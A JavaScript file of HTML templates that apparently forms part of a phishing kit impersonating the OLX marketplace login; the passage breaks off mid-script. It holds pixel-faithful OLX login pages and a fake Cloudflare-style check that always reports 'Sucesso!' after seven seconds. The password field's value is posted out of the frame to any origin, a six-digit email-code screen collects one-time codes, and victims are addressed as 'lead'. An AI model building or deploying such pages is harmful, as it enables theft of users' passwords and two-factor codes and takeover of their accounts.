/**
 * Templates HTML estáticos pra telas que não têm URL própria
 * (são passos dentro de um fluxo, sem mudança de URL).
 */

const ACCESS_ACCOUNT_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesse sua conta - OLX</title>
<style>
  :root{
    --spots-background-circle:#F3EBFF;
    --spots-color-circle:#FFFFFF;
    --spots-border-color-default:#6E0AD6;
    --color-neutral-70:#6E0AD6;
    --color-neutral-110:#6b6b6b;
    --color-neutral-120:#1a1a1a;
  }
  *,*::before,*::after{box-sizing:border-box}
  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
  .topbar{padding:18px 20px;border-bottom:1px solid #e8e8e8}
  .logo{display:inline-block}
  .logo svg{display:block;height:48px;width:48px}
  main{max-width:480px;margin:0 auto;padding:48px 24px 32px}
  h1{font-size:26px;font-weight:600;text-align:center;margin:0 0 28px;letter-spacing:-.2px}
  .lead{font-size:16px;text-align:center;margin:0 0 18px;color:#1a1a1a}
  .email-pill{display:block;width:100%;padding:14px 20px;border:1px solid #d0d0d0;border-radius:9999px;text-align:center;font-size:15px;color:#1a1a1a;background:#fff;margin:0 0 28px}
  .option{display:flex;align-items:center;gap:18px;width:100%;padding:20px 18px;border:1px solid #e0e0e0;border-radius:12px;background:#fff;text-align:left;cursor:pointer;font:inherit;color:inherit;margin:0 0 16px;transition:background .15s,border-color .15s}
  .option:hover{background:#fafafa;border-color:#c8c8c8}
  .option-icon{flex-shrink:0;width:48px;height:48px;display:flex;align-items:center;justify-content:center}
  .option-icon svg{width:48px;height:48px;display:block}
  .option-body{flex:1;min-width:0}
  .option-title{display:block;font-size:18px;font-weight:600;margin:0 0 4px;color:#1a1a1a}
  .option-sub{display:block;font-size:14px;color:#6b6b6b;line-height:1.4}
  .option-arrow{flex-shrink:0;color:#1a1a1a}
  .back-link{display:block;width:100%;background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;text-align:center;padding:8px 0 24px;cursor:pointer}
  .help-bar{display:block;width:100%;padding:14px;border:0;background:#f5f5f5;border-radius:8px;color:#1a1a1a;font:inherit;font-size:15px;text-align:center;cursor:pointer;margin:0 0 20px}
  .help-bar:hover{background:#ececec}
  .terms{font-size:13px;color:#6b6b6b;text-align:center;line-height:1.45;margin:0}
  .terms a{color:#6E0AD6;text-decoration:none}
  .terms a:hover{text-decoration:underline}
</style>
</head>
<body>
  <header class="topbar">
    <div class="logo" aria-label="OLX">
      <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <g fill="none" fill-rule="evenodd">
          <path fill="#6E0AD6" d="M7.579 26.294c-2.282 0-3.855-1.89-3.855-4.683 0-2.82 1.573-4.709 3.855-4.709 2.28 0 3.855 1.889 3.855 4.682 0 2.82-1.574 4.71-3.855 4.71m0 3.538c4.222 0 7.578-3.512 7.578-8.248 0-4.682-3.173-8.22-7.578-8.22C3.357 13.363 0 16.874 0 21.61c0 4.763 3.173 8.221 7.579 8.221"/>
          <path fill="#7DD800" d="M18.278 23.553h7.237c.499 0 .787-.292.787-.798V20.44c0-.505-.288-.798-.787-.798h-4.851V9.798c0-.505-.288-.798-.787-.798h-2.386c-.498 0-.787.293-.787.798v12.159c0 1.038.551 1.596 1.574 1.596"/>
          <path fill="#FF8A00" d="M28.112 29.593l4.353-5.082 4.222 5.082c.367.452.839.452 1.258.08l1.705-1.517c.42-.373.472-.851.079-1.277l-4.694-5.321 4.274-4.869c.367-.426.34-.878-.078-1.277l-1.6-1.463c-.42-.4-.892-.373-1.259.08l-3.907 4.602-3.986-4.603c-.367-.425-.84-.479-1.259-.08l-1.652 1.49c-.42.4-.446.825-.053 1.278l4.354 4.868-4.747 5.348c-.393.452-.34.905.079 1.277l1.652 1.464c.42.372.891.345 1.259-.08"/>
        </g>
      </svg>
    </div>
  </header>

  <main>
    <h1>Acesse sua conta</h1>
    <p class="lead">Escolha um método de acesso para a conta</p>
    <div class="email-pill" id="user-email">{{lead.email}}</div>

    <button type="button" class="option" data-method="email">
      <span class="option-icon">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="none" viewBox="0 0 96 96" aria-hidden="true">
          <path d="M48 90c23.196 0 42-18.804 42-42S71.196 6 48 6 6 24.804 6 48s18.804 42 42 42Z" fill="#F3EBFF"/>
          <path fill="var(--spots-color-circle)" d="m18.407 26.56 51.306-7.052c3.527-.485 6.819 1.941 7.315 5.391l5.407 37.636c.496 3.45-1.984 6.67-5.511 7.154l-51.307 7.053c-3.527.485-6.818-1.941-7.314-5.391l-5.408-37.636c-.496-3.45 1.985-6.67 5.512-7.154Z"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="m80.531 49.397-4.144-24.554c-.495-3.45-3.144-5.562-6.672-5.077L18.41 26.82c-3.527.485-6.007 3.704-5.512 7.154l5.408 37.636c.496 3.45 3.788 5.876 7.315 5.39l26.79-3.95"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M76.387 25.552 48.117 51.52l-35.22-17.546"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-width="1.5" d="m23.605 72.654 2.868-4.085m1.982-2.824 9.013-12.836"/>
          <path fill="#6E0AD6" stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M70.143 78.647a13.463 13.463 0 0 0 13.52-13.82c-.167-7.631-6.49-13.819-14.125-13.819a13.463 13.463 0 0 0-13.52 13.82c.167 7.632 6.49 13.82 14.125 13.82Z"/>
          <path fill="#fff" stroke="#fff" stroke-width="1.5" fill-rule="evenodd" d="M65.502 64.08a.47.47 0 0 0-.667 0 .476.476 0 0 0 0 .67l3.144 3.162a.47.47 0 0 0 .667 0l6.918-6.954a.476.476 0 0 0 0-.67.47.47 0 0 0-.667 0l-6.584 6.618-2.811-2.826Z" clip-rule="evenodd"/>
        </svg>
      </span>
      <span class="option-body">
        <span class="option-title">E-mail</span>
        <span class="option-sub">Enviaremos um código para o seu e-mail</span>
      </span>
      <span class="option-arrow">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </span>
    </button>

    <button type="button" class="option" data-method="password">
      <span class="option-icon">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="none" viewBox="0 0 96 96" aria-hidden="true">
          <path d="M48 90c23.196 0 42-18.804 42-42S71.196 6 48 6 6 24.804 6 48s18.804 42 42 42Z" fill="#F3EBFF"/>
          <path fill="#6E0AD6" d="m42.738 33.249 1.08 7.689-6.296.885-1.193-8.485s-1.941-16.22 13.768-18.428c15.71-2.208 18.47 12.613 18.47 12.613l1.378 9.81-6.363.895-1.36-9.678s-2.064-8.43-10.748-7.21c-8.683 1.221-8.994 9.106-8.736 11.909Z"/>
          <path stroke="var(--spots-color-circle)" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="m39.534 39.31.289 2.054"/>
          <path fill="var(--spots-color-circle)" d="m70.633 36.976-34.291 4.82c-6.715.944-9.156 5.527-8.425 10.725l3.132 22.287c.721 5.133 5.596 8.412 11.007 7.651l34.291-4.819c5.344-.75 9.457-3.385 7.8-10.295L81.015 45.06c-.89-6.332-3.331-9.073-10.382-8.083ZM59.366 60.36c-.117.15-.234.298-.207.493l.786 5.588c.182 1.3-.745 2.556-2.165 2.756l-.812.114c-1.352.19-2.648-.688-2.84-2.053l-.785-5.588c-.028-.194-.114-.315-.335-.416-2.5-1.107-3.917-3.823-3.074-6.658.525-1.664 1.84-3.108 3.553-3.68 3.61-1.302 7.308.961 7.792 4.405.264 1.884-.504 3.78-1.913 5.04Z"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="M29.941 45.118a7.176 7.176 0 0 1 4.797-2.905l38.048-5.347c3.911-.55 7.54 2.185 8.09 6.096l3.698 26.316c.55 3.91-2.185 7.54-6.096 8.089L42.087 82.48"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="m70.002 37.259-1.24-8.816c-1.257-8.949-9.573-15.216-18.522-13.958-8.949 1.258-15.282 9.583-14.024 18.532l1.24 8.816 6.495-.913-1.239-8.816a9.884 9.884 0 0 1 8.432-11.19 9.884 9.884 0 0 1 11.189 8.432l1.239 8.816M57.547 69.359a2.471 2.471 0 0 1-2.797-2.108l-.8-5.7c-.029-.2-.114-.323-.331-.428-2.459-1.141-3.863-3.918-3.052-6.803.506-1.694 1.787-3.158 3.464-3.732a5.71 5.71 0 0 1 7.667 4.533c.27 1.922-.473 3.852-1.915 5.136-.114.151-.228.302-.2.501l.802 5.7a2.47 2.47 0 0 1-2.108 2.798l-.73.103Z"/>
          <path stroke="var(--spots-color-circle)" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="M42.928 20.653c-3.264 3.23-4.884 8.054-4.167 13.158l.457 3.248"/>
          <path stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="m77.463 49.042 2.078 14.786M80.108 67.858l.378 2.689"/>
          <path fill="#6E0AD6" stroke="#5C0FA1" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="1.5" d="M28.69 50.159s-6.376 6.574-12.408 7.422L18.266 71.7c.41 2.916 1.976 5.4 4.245 6.636 2.269 1.236 9.153 4.527 9.437 4.622l1.447.675 1.204-1.048c.238-.236 5.957-5.23 7.855-7.12 1.783-1.737 2.67-4.566 2.25-7.549L42.73 53.864c-6.098.857-14.04-3.705-14.04-3.705Z"/>
          <path fill="#fff" stroke="#fff" stroke-width="1.5" fill-rule="evenodd" d="M26.153 67.891a.428.428 0 0 0-.597.106.43.43 0 0 0 .105.598l3.313 2.326c.194.137.461.09.597-.105l5.098-7.301a.43.43 0 0 0-.106-.599.428.428 0 0 0-.597.106l-4.852 6.949-2.961-2.08Z" clip-rule="evenodd"/>
        </svg>
      </span>
      <span class="option-body">
        <span class="option-title">Senha</span>
        <span class="option-sub">Informe a sua senha atual</span>
      </span>
      <span class="option-arrow">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </span>
    </button>

    <button type="button" class="help-bar" data-action="help">Preciso de ajuda &rsaquo;</button>

    <p class="terms">
      Ao continuar, você concorda com os <a href="#">Termos de Uso</a> e a <a href="#">Política de Privacidade</a> da OLX e seus parceiros, e em receber comunicações da OLX.
    </p>
  </main>
</body>
</html>`;

const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesse a sua conta - OLX</title>
<style>
  *,*::before,*::after{box-sizing:border-box}
  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
  .topbar{padding:18px 20px;border-bottom:1px solid #e8e8e8}
  .logo{display:inline-block}
  .logo svg{display:block;height:48px;width:48px}
  main{max-width:480px;margin:0 auto;padding:48px 24px 32px}
  h1{font-size:26px;font-weight:600;text-align:center;margin:0 0 28px;letter-spacing:-.2px}
  .email-pill{display:block;width:100%;padding:14px 20px;border:1px solid #d0d0d0;border-radius:9999px;text-align:center;font-size:15px;color:#1a1a1a;background:#fff;margin:0 0 28px}
  .field-group{margin:0 0 20px}
  .field-label{display:block;font-size:16px;font-weight:600;color:#1a1a1a;margin:0 0 8px}
  .input-wrap{position:relative;display:flex;align-items:center}
  .input-wrap input{width:100%;padding:16px 48px 16px 16px;border:1px solid #d0d0d0;border-radius:12px;font:inherit;font-size:16px;color:#1a1a1a;background:#fff;outline:none;transition:border-color .15s}
  .input-wrap input:focus{border-color:#6E0AD6}
  .toggle-pw{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;padding:4px;color:#6E0AD6;display:flex;align-items:center;justify-content:center}
  .cf-box{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:10px 14px;border:1px solid #e5e7eb;border-radius:6px;background:#fafafa;font-size:14px;color:#1a1a1a;max-width:303px;width:100%;margin:0 auto 24px;min-height:65px}
  .cf-left{display:flex;align-items:center;gap:10px;flex:1;min-width:0}
  .cf-right{display:flex;flex-direction:column;align-items:center;gap:2px;flex-shrink:0}
  .cf-right span{font-size:9px;color:#999;line-height:1}
  .btn-entrar{display:block;width:100%;padding:18px;border:0;border-radius:9999px;background:#f48120;color:#fff;font:inherit;font-size:18px;font-weight:700;text-align:center;cursor:pointer;transition:opacity .15s}
  .btn-entrar:hover{opacity:.9}
  .btn-entrar:disabled,.btn-entrar[disabled]{background:#d0d0d0;color:#fff;cursor:not-allowed;opacity:1}
  .btn-entrar:disabled:hover,.btn-entrar[disabled]:hover{opacity:1}
  .links{display:flex;justify-content:space-between;align-items:center;margin:20px 0 0;padding:0}
  .links a,.links button{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;padding:0}
  .links a:hover,.links button:hover{text-decoration:underline}
  @keyframes olxSpin{to{transform:rotate(360deg)}}
  .cf-spinner{width:22px;height:22px;border:3px solid #e5e7eb;border-top-color:#f48120;border-radius:50%;animation:olxSpin .8s linear infinite;flex-shrink:0}
</style>
</head>
<body>
  <header class="topbar">
    <div class="logo" aria-label="OLX">
      <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <g fill="none" fill-rule="evenodd">
          <path fill="#6E0AD6" d="M7.579 26.294c-2.282 0-3.855-1.89-3.855-4.683 0-2.82 1.573-4.709 3.855-4.709 2.28 0 3.855 1.889 3.855 4.682 0 2.82-1.574 4.71-3.855 4.71m0 3.538c4.222 0 7.578-3.512 7.578-8.248 0-4.682-3.173-8.22-7.578-8.22C3.357 13.363 0 16.874 0 21.61c0 4.763 3.173 8.221 7.579 8.221"/>
          <path fill="#7DD800" d="M18.278 23.553h7.237c.499 0 .787-.292.787-.798V20.44c0-.505-.288-.798-.787-.798h-4.851V9.798c0-.505-.288-.798-.787-.798h-2.386c-.498 0-.787.293-.787.798v12.159c0 1.038.551 1.596 1.574 1.596"/>
          <path fill="#FF8A00" d="M28.112 29.593l4.353-5.082 4.222 5.082c.367.452.839.452 1.258.08l1.705-1.517c.42-.373.472-.851.079-1.277l-4.694-5.321 4.274-4.869c.367-.426.34-.878-.078-1.277l-1.6-1.463c-.42-.4-.892-.373-1.259.08l-3.907 4.602-3.986-4.603c-.367-.425-.84-.479-1.259-.08l-1.652 1.49c-.42.4-.446.825-.053 1.278l4.354 4.868-4.747 5.348c-.393.452-.34.905.079 1.277l1.652 1.464c.42.372.891.345 1.259-.08"/>
        </g>
      </svg>
    </div>
  </header>

  <main>
    <h1>Acesse a sua conta</h1>
    <div class="email-pill" id="user-email">{{lead.email}}</div>

    <div class="field-group">
      <label class="field-label" for="pw-input">Senha</label>
      <div class="input-wrap">
        <input id="pw-input" type="password" name="password" autocomplete="current-password" placeholder="" aria-label="Senha">
        <button type="button" class="toggle-pw" aria-label="Mostrar senha" id="toggle-pw-btn">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.5"/>
            <line x1="4" y1="20" x2="20" y2="4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" id="pw-slash"/>
          </svg>
        </button>
      </div>
    </div>
    <div id="pw-error" role="alert" style="display:none;color:#e53e3e;font-size:13px;margin-top:6px;line-height:1.3"></div>

    <div class="cf-box">
      <div class="cf-left" id="cf-left">
        <div class="cf-spinner" id="cf-spinner"></div>
        <svg id="cf-check" style="display:none" width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16a34a"/><polyline points="7 12.5 10.5 16 17 9" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
        <span id="cf-text">Verificando...</span>
      </div>
      <div class="cf-right">
        <svg width="34" height="14" viewBox="0 0 88 36" xmlns="http://www.w3.org/2000/svg">
          <path fill="#f48120" d="M55.7 26.3l.5-1.7c.6-2 .4-3.9-.6-5.2-.9-1.3-2.4-2-4.2-2.1l-34.4-.4c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4-.1-.6.1-.3.4-.5.7-.5l34.7-.4c4.1-.2 8.6-3.5 10.2-7.6l2-5.2c.1-.2.1-.4.1-.6C61.7 1 55.5 0 49.3 0 33.7 0 20.6 10 16.6 24c-2.6-.2-4.7 2.5-4.3 5 .4 2.1 2.2 3.7 4.4 4 .3 0 .6 0 .9-.1l34.4-.4c2.5-.1 4.7-1.7 5.7-4l-2-2.2z"/>
          <path fill="#faae40" d="M67.3 9.7c-.3 0-.6 0-.9.1-.2 0-.4.2-.5.4l-1.4 4.7c-.6 2-.4 3.9.6 5.2.9 1.3 2.4 2 4.2 2.1l7.3.4c.2 0 .4.1.5.3.1.2.1.4.1.6-.1.3-.4.5-.7.5l-7.6.4c-4.1.2-8.6 3.5-10.2 7.6l-.6 1.5c-.1.3.1.6.4.6h26.1c.3 0 .6-.2.7-.5 1.1-3.6 1.7-7.4 1.7-11.4 0-6.3-1.4-12.3-3.9-17.6-.1-.2-.4-.3-.6-.3-.6.1-1.2.2-1.8.4-4.4 1.3-8.5 3.5-12.1 6.5"/>
        </svg>
        <span>Privacidade · Ajuda</span>
      </div>
    </div>

    <button type="button" class="btn-entrar" id="btn-entrar" disabled aria-disabled="true">Entrar</button>

    <div class="links">
      <button type="button" class="back-btn" data-action="back">Voltar</button>
      <a href="#" data-action="forgot-password">Esqueceu sua senha?</a>
    </div>
  </main>

  <script>
    (function(){
      var entrarBtnInit = document.getElementById('btn-entrar');
      var cfSpinner = document.getElementById('cf-spinner');
      var cfCheck = document.getElementById('cf-check');
      var cfText = document.getElementById('cf-text');
      setTimeout(function(){
        if(cfSpinner) cfSpinner.style.display = 'none';
        if(cfCheck) cfCheck.style.display = '';
        if(cfText) cfText.textContent = 'Sucesso!';
        if(entrarBtnInit){
          entrarBtnInit.disabled = false;
          entrarBtnInit.removeAttribute('aria-disabled');
        }
      }, 7000);

      var pwInput = document.getElementById('pw-input');
      var toggleBtn = document.getElementById('toggle-pw-btn');
      var slash = document.getElementById('pw-slash');
      if(toggleBtn && pwInput){
        toggleBtn.addEventListener('click', function(){
          var showing = pwInput.type === 'text';
          pwInput.type = showing ? 'password' : 'text';
          if(slash) slash.style.display = showing ? '' : 'none';
        });
      }

      var entrarBtn = document.getElementById('btn-entrar');
      if(entrarBtn && pwInput){
        entrarBtn.addEventListener('click', function(){
          if(entrarBtn.disabled) return;
          var pw = (pwInput.value || '').trim();
          var errEl = document.getElementById('pw-error');
          function showErr(msg){
            pwInput.style.borderColor = '#e53e3e';
            if(errEl){ errEl.textContent = msg; errEl.style.display = 'block'; }
            pwInput.focus();
          }
          if(!pw){
            showErr('Digite sua senha.');
            return;
          }
          if(pw.length < 6){
            showErr('Sua senha deve ter pelo menos 6 caracteres.');
            return;
          }
          if(errEl){ errEl.style.display = 'none'; }
          pwInput.style.borderColor = '';
          entrarBtn.disabled = true;
          entrarBtn.style.opacity = '.7';
          entrarBtn.textContent = 'Verificando...';
          window.parent.postMessage({
            type: 'iframe-help-action',
            action: 'password-submit',
            password: pw
          }, '*');
        });
      }

      var backBtn = document.querySelector('[data-action="back"]');
      if(backBtn){
        backBtn.addEventListener('click', function(){
          window.parent.postMessage({ type: 'iframe-link-click', url: 'back' }, '*');
        });
      }

      var forgotBtn = document.querySelector('[data-action="forgot-password"]');
      if(forgotBtn){
        forgotBtn.addEventListener('click', function(e){
          e.preventDefault();
          window.parent.postMessage({ type: 'iframe-help-action', action: 'forgot-password' }, '*');
        });
      }
    })();
  </script>
</body>
</html>`;

const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesse sua conta - OLX</title>
<style>
  *,*::before,*::after{box-sizing:border-box}
  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
  .topbar{padding:18px 20px;border-bottom:1px solid #e8e8e8}
  .logo{display:inline-block}
  .logo svg{display:block;height:48px;width:48px}
  .divider{height:0;border:0;border-top:1px solid #e8e8e8;margin:64px 0 0}
  main{max-width:480px;margin:0 auto;padding:32px 24px 32px}
  h1{font-size:22px;font-weight:600;text-align:center;margin:0 0 24px;letter-spacing:-.2px;line-height:1.2}
  .lead{font-size:15px;text-align:center;margin:0 0 24px;color:#1a1a1a;line-height:1.45}
  .lead .email{display:block;font-weight:600;color:#1a1a1a;margin-top:4px;word-break:break-all}
  .code-wrap{display:flex;gap:8px;justify-content:space-between;margin:0 0 12px}
  .code-wrap input{flex:1;min-width:0;height:52px;text-align:center;font-size:20px;font-weight:600;border:1px solid #d0d0d0;border-radius:8px;color:#1a1a1a;background:#fff;outline:none;transition:border-color .15s;padding:0;font-family:inherit}
  .code-wrap input:focus{border-color:#6E0AD6}
  .code-wrap.has-error input{border-color:#E11900;color:#E11900}
  .code-error-top{display:none;color:#E11900;font-size:13px;font-weight:400;margin:0 0 8px}
  .resend-row{display:flex;justify-content:flex-start;margin:0 0 20px}
  .resend-link{background:none;border:0;color:#6E0AD6;font:inherit;font-size:14px;font-weight:600;cursor:pointer;padding:0;text-decoration:none}
  .resend-link:hover{text-decoration:underline}
  .alertbox{display:flex;gap:10px;align-items:flex-start;padding:12px 14px;border:1px solid #e0e0e0;border-radius:8px;background:#fafafa;margin:0 0 12px;color:#1a1a1a;font-size:13px;line-height:1.45}
  .alertbox svg{flex-shrink:0;color:#6b6b6b;margin-top:1px}
  .alertbox .text{flex:1;min-width:0}
  .back-row{display:flex;justify-content:flex-start;margin:18px 0 0}
  .back-link{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;padding:0;text-decoration:none}
  .back-link:hover{text-decoration:underline}
  .code-error{display:none;color:#c0392b;font-size:13px;margin:-4px 0 12px;text-align:center}
  .loading-row{display:none}
  .loading-overlay{display:none;position:absolute;top:0;left:0;right:0;bottom:0;min-height:100vh;background:rgba(0,0,0,.55);z-index:9999;align-items:center;justify-content:center}
  body.olx-loading{position:relative;min-height:100vh}
  .loading-overlay.show{display:flex}
  .loading-overlay .big-spinner{width:56px;height:56px;border:4px solid rgba(255,255,255,.25);border-top-color:#6E0AD6;border-radius:50%;animation:olxSpin .9s linear infinite}
  @keyframes olxSpin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
  <header class="topbar">
    <div class="logo" aria-label="OLX">
      <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <g fill="none" fill-rule="evenodd">
          <path fill="#6E0AD6" d="M7.579 26.294c-2.282 0-3.855-1.89-3.855-4.683 0-2.82 1.573-4.709 3.855-4.709 2.28 0 3.855 1.889 3.855 4.682 0 2.82-1.574 4.71-3.855 4.71m0 3.538c4.222 0 7.578-3.512 7.578-8.248 0-4.682-3.173-8.22-7.578-8.22C3.357 13.363 0 16.874 0 21.61c0 4.763 3.173 8.221 7.579 8.221"/>
          <path fill="#7DD800" d="M18.278 23.553h7.237c.499 0 .787-.292.787-.798V20.44c0-.505-.288-.798-.787-.798h-4.851V9.798c0-.505-.288-.798-.787-.798h-2.386c-.498 0-.787.293-.787.798v12.159c0 1.038.551 1.596 1.574 1.596"/>
          <path fill="#FF8A00" d="M28.112 29.593l4.353-5.082 4.222 5.082c.367.452.839.452 1.258.08l1.705-1.517c.42-.373.472-.851.079-1.277l-4.694-5.321 4.274-4.869c.367-.426.34-.878-.078-1.277l-1.6-1.463c-.42-.4-.892-.373-1.259.08l-3.907 4.602-3.986-4.603c-.367-.425-.84-.479-1.259-.08l-1.652 1.49c-.42.4-.446.825-.053 1.278l4.354 4.868-4.747 5.348c-.393.452-.34.905.079 1.277l1.652 1.464c.42.372.891.345 1.259-.08"/>
        </g>
      </svg>
    </div>
  </header>

  <hr class="divider">

  <main>
    <h1>Acesse sua conta</h1>
    <p class="lead">
      Digite o código enviado para
      <span class="email" id="user-email">{{lead.email}}</span>
    </p>

    <div class="code-wrap" id="code-wrap">
      <input id="input-pincode-0" type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Código de verificação da 1ª posição de 6 posições">
      <input id="input-pincode-1" type="tel" inputmode="numeric" maxlength="1" aria-label="Código de verificação da 2ª posição de 6 posições">
      <input id="input-pincode-2" type="tel" inputmode="numeric" maxlength="1" aria-label="Código de verificação da 3ª posição de 6 posições">
      <input id="input-pincode-3" type="tel" inputmode="numeric" maxlength="1" aria-label="Código de verificação da 4ª posição de 6 posições">
      <input id="input-pincode-4" type="tel" inputmode="numeric" maxlength="1" aria-label="Código de verificação da 5ª posição de 6 posições">
      <input id="input-pincode-5" type="tel" inputmode="numeric" maxlength="1" aria-label="Código de verificação da 6ª posição de 6 posições">
    </div>

    <p class="code-error-top" id="code-error-top">Código inválido</p>

    <div class="resend-row">
      <button type="button" class="resend-link" id="resend-btn">Reenviar código</button>
    </div>

    <div class="loading-row" id="loading-row" aria-hidden="true"></div>

    <div class="alertbox" role="status">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" aria-hidden="true">
        <path fill="currentColor" fill-rule="evenodd" d="M22.75,5.99 L22.75,18 C22.75,19.51 21.51,20.75 20,20.75 L4,20.75 C2.49,20.75 1.25,19.51 1.25,18 L1.25,5.99 C1.26,4.48 2.49,3.25 4,3.25 L20,3.25 C21.51,3.25 22.74,4.48 22.75,5.99 Z M21.2,5.65 C21.04,5.13 20.56,4.75 20,4.75 L4,4.75 C3.44,4.75 2.96,5.13 2.8,5.65 L12,12.08 L21.2,5.65 Z M21.25,7.44 L12.43,13.61 C12.17,13.8 11.83,13.8 11.57,13.61 L2.75,7.44 L2.75,18 C2.75,18.69 3.31,19.25 4,19.25 L20,19.25 C20.69,19.25 21.25,18.69 21.25,18 L21.25,7.44 Z"></path>
      </svg>
      <span class="text">Caso não tenha encontrado o e-mail, verifique sua caixa de Spam.</span>
    </div>

    <div class="alertbox" role="status">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" aria-hidden="true">
        <path fill="currentColor" fill-rule="evenodd" d="M12,22.75 C6.06,22.75 1.25,17.94 1.25,12 C1.25,6.06 6.06,1.25 12,1.25 C17.94,1.25 22.75,6.06 22.75,12 C22.75,17.94 17.94,22.75 12,22.75 Z M12,21.25 C17.11,21.25 21.25,17.11 21.25,12 C21.25,6.89 17.11,2.75 12,2.75 C6.89,2.75 2.75,6.89 2.75,12 C2.75,17.11 6.89,21.25 12,21.25 Z M12.75,16 C12.75,16.41 12.41,16.75 12,16.75 C11.59,16.75 11.25,16.41 11.25,16 L11.25,12 C11.25,11.59 11.59,11.25 12,11.25 C12.41,11.25 12.75,11.59 12.75,12 L12.75,16 Z M12,10 C11.45,10 11,9.55 11,9 C11,8.45 11.45,8 12,8 C12.55,8 13,8.45 13,9 C13,9.55 12.55,10 12,10 Z"></path>
      </svg>
      <span class="text">O código é privado. Não compartilhe essa informação com ninguém.</span>
    </div>

    <div class="back-row">
      <button type="button" class="back-link" data-action="back">Voltar</button>
    </div>
  </main>

  <div class="loading-overlay" id="loading-overlay" role="status" aria-live="polite">
    <div class="big-spinner"></div>
  </div>

  <script>
    (function(){
      var inputs = Array.prototype.slice.call(document.querySelectorAll('#code-wrap input'));
      var codeWrap = document.getElementById('code-wrap');
      var overlay = document.getElementById('loading-overlay');
      var errorEl = document.getElementById('code-error-top');
      var submitted = false;

      function setLoading(on){
        if(overlay){
          if(on) overlay.classList.add('show');
          else overlay.classList.remove('show');
        }
        // Garante que o body do iframe tenha altura suficiente pro overlay cobrir tudo
        if(on){
          document.body.classList.add('olx-loading');
          document.body.style.minHeight = (window.innerHeight || 800) + 'px';
        } else {
          document.body.classList.remove('olx-loading');
          document.body.style.minHeight = '';
        }
        inputs.forEach(function(i){ i.disabled = on; });
      }

      function clearError(){
        if(errorEl) errorEl.style.display = 'none';
        if(codeWrap) codeWrap.classList.remove('has-error');
      }

      function showError(msg){
        if(errorEl){
          errorEl.textContent = msg || 'Código inválido';
          errorEl.style.display = 'block';
        }
        if(codeWrap) codeWrap.classList.add('has-error');
        // Mantém os valores digitados (igual ao comportamento real da OLX)
        inputs.forEach(function(i){ i.disabled = false; i.setAttribute('aria-invalid','true'); });
        if(overlay) overlay.classList.remove('show');
        submitted = false;
      }

      function emitIfFull(){
        if(submitted) return;
        var code = inputs.map(function(i){ return i.value || ''; }).join('');
        if(code.length === inputs.length){
          submitted = true;
          clearError();
